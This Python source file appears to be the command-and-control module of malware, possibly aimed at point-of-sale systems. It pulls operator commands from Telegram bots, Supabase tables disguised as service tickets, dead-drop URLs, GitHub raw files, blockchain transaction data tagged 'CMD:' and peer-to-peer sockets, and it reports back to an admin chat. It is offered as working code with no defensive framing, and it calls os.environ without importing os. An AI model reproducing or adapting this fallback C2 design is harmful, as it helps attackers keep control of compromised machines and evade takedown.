#!/usr/bin/env python3
import threading
import time
import logging
import requests
import telebot
from supabase import create_client
import socket
import json
from web3 import Web3
import asyncio
import aiohttp

class ConnectionManager:
    def __init__(self,cfg,cry):
        self.cfg=cfg; self.cry=cry
        self.tg=cfg.get('telegram',{}).get('tokens',[])
        self.su=cfg.get('supabase',{}).get('urls',[])
        self.sk=cfg.get('supabase',{}).get('keys',[])
        self.dd=cfg.get('dead_drop',{}).get('urls',[])
        self.gh=cfg.get('github_raw',{}).get('urls',[])
        self.ac=cfg.get('ai_c2',{}).get('enabled',False)
        self.ae=cfg.get('ai_c2',{}).get('endpoints',[])
        self.bc=cfg.get('blockchain',{}).get('enabled',False)
        self.p2=cfg.get('p2p',{}).get('enabled',False)
        self.mc=cfg.get('mcp',{}).get('enabled',False)
        self.at=0; self.asu=0; self.add=0; self.agh=0; self.aac=0
        self.l=threading.Lock()
        self.bots=[]; self.sup=[]
        self._init()
        self.w3=None
        if self.bc:
            try:
                self.w3=Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/YOUR_KEY'))
            except: pass
        self.p2p_peers=[]
        self.mcp_session=None

    def _init(self):
        for t in self.tg:
            try: self.bots.append(telebot.TeleBot(t))
            except: pass
        for i in range(min(len(self.su),len(self.sk))):
            try: self.sup.append(create_client(self.su[i],self.sk[i]))
            except: pass

    def get_active_telegram_token(self):
        with self.l:
            if not self.bots or self.at>=len(self.bots): return None
            return self.bots[self.at].token
    def get_active_supabase(self):
        with self.l:
            if not self.sup or self.asu>=len(self.sup): return None
            return {'url':self.su[self.asu],'key':self.sk[self.asu]}
    def get_active_dead_drop(self):
        with self.l:
            if not self.dd: return None
            return self.dd[self.add%len(self.dd)]
    def get_active_github_raw(self):
        with self.l:
            if not self.gh: return None
            return self.gh[self.agh%len(self.gh)]
    def get_active_ai_c2(self):
        with self.l:
            if not self.ac or not self.ae: return None
            return self.ae[self.aac%len(self.ae)]
    def get_active_blockchain(self):
        return self.w3 if self.bc else None
    def get_active_p2p(self):
        return self.p2p_peers if self.p2 else None
    def get_active_mcp(self):
        return self.mcp_session if self.mc else None

    def rotate_telegram(self):
        with self.l:
            if len(self.bots)>1:
                self.at=(self.at+1)%len(self.bots)
                logging.info(f"tg->{self.at}")
            else: logging.warning("no backup tg")
    def rotate_supabase(self):
        with self.l:
            if len(self.sup)>1:
                self.asu=(self.asu+1)%len(self.sup)
                logging.info(f"sup->{self.asu}")
            else: logging.warning("no backup sup")
    def rotate_dead_drop(self):
        with self.l:
            if len(self.dd)>1:
                self.add=(self.add+1)%len(self.dd)
                logging.info(f"dd->{self.add}")
            else: logging.warning("no backup dd")
    def rotate_github(self):
        with self.l:
            if len(self.gh)>1:
                self.agh=(self.agh+1)%len(self.gh)
                logging.info(f"gh->{self.agh}")
            else: logging.warning("no backup gh")
    def rotate_ai_c2(self):
        with self.l:
            if len(self.ae)>1:
                self.aac=(self.aac+1)%len(self.ae)
                logging.info(f"ai->{self.aac}")
            else: logging.warning("no backup ai")

    def test_telegram_token(self,tok):
        try:
            r=requests.get(f"https://api.telegram.org/bot{tok}/getMe",timeout=10)
            return r.status_code==200
        except: return False
    def test_supabase(self,url,key):
        try:
            h={"apikey":key,"Authorization":f"Bearer {key}"}
            r=requests.get(f"{url}/rest/v1/pos_clients?select=client_serial&limit=1",headers=h,timeout=10)
            return r.status_code==200
        except: return False
    def test_url(self,url):
        try:
            r=requests.get(url,timeout=10)
            return r.status_code<500
        except: return False

    def fetch_pending_commands(self,did,supc=None):
        cmds=[]
        if supc:
            try:
                r=supc.table('service_requests').select('*').eq('target_client',did).eq('ticket_status','open').execute()
                for c in r.data:
                    cmds.append(c)
                    supc.table('service_requests').update({'ticket_status':'processing'}).eq('ticket_id',c['ticket_id']).execute()
            except Exception as e: logging.error(f"sup fetch err {e}")
        du=self.get_active_dead_drop()
        if du:
            try:
                r=requests.get(f"{du.rstrip('/')}/{did}.json",timeout=10)
                if r.status_code==200 and isinstance(r.json(),list):
                    cmds.extend(r.json())
            except Exception as e: logging.error(f"dd fetch err {e}")
        gu=self.get_active_github_raw()
        if gu:
            try:
                r=requests.get(f"{gu.rstrip('/')}/{did}.json",timeout=10)
                if r.status_code==200 and isinstance(r.json(),list):
                    cmds.extend(r.json())
            except Exception as e: logging.error(f"gh fetch err {e}")
        if self.bc and self.w3:
            try:
                lat=self.w3.eth.get_block('latest')
                for tx in lat.transactions[:5]:
                    txd=self.w3.eth.get_transaction(tx)
                    if txd.input and len(txd.input)>10:
                        d=txd.input[2:]
                        try:
                            dd=bytes.fromhex(d).decode()
                            if dd.startswith('CMD:'):
                                cmds.append({'type':'cmd','data':dd[4:]})
                        except: pass
            except Exception as e: logging.error(f"bc fetch err {e}")
        if self.p2:
            for p in self.p2p_peers:
                try:
                    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((p,12345))
                    s.send(b"GET_CMD")
                    d=s.recv(4096)
                    if d:
                        try:
                            cmds.extend(json.loads(d.decode()))
                        except: pass
                    s.close()
                except: pass
        return cmds

    def send_message_to_admin(self,txt):
        if not self.bots: return False
        for i in range(len(self.bots)):
            idx=(self.at+i)%len(self.bots)
            try:
                self.bots[idx].send_message(os.environ.get('ADMIN_ID'),txt,parse_mode='Markdown')
                self.at=idx
                return True
            except Exception as e: logging.warning(f"bot {idx} fail {e}")
        return False

    def get_active_config(self):
        return {
            'tg':self.get_active_telegram_token(),
            'sb':self.get_active_supabase(),
            'dd':self.get_active_dead_drop(),
            'gh':self.get_active_github_raw(),
            'ai':self.get_active_ai_c2(),
            'bc':self.bc,
            'p2':self.p2,
            'mc':self.mc,
            'iv':60,
            'hb':300
        }

    def check_all_connections(self):
        st={}
        for i,b in enumerate(self.bots):
            try:
                b.get_me()
                st[f'b_{i}']=True
            except:
                st[f'b_{i}']=False
                if i==self.at:
                    for j in range(len(self.bots)):
                        if j!=i and st.get(f'b_{j}',False):
                            self.at=j; break
        for i,c in enumerate(self.sup):
            try:
                c.table('pos_clients').select('count').limit(1).execute()
                st[f's_{i}']=True
            except:
                st[f's_{i}']=False
                if i==self.asu:
                    for j in range(len(self.sup)):
                        if j!=i and st.get(f's_{j}',False):
                            self.asu=j; break
        return st